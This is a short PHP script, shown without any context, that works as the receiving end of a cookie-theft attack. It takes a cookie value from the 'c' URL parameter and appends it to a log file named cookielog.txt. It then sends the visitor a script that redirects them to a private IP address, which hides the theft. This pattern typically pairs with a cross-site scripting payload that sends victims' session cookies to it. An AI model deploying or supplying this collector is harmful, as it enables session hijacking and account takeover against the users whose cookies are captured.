<?php
$cookie = $_GET['c'];
$file = fopen("cookielog.txt", "a");
fwrite($file, $cookie . "\n\n");
fclose($file);
echo " <script>location.href='http://192.168.146.128/';</script>";
?> 
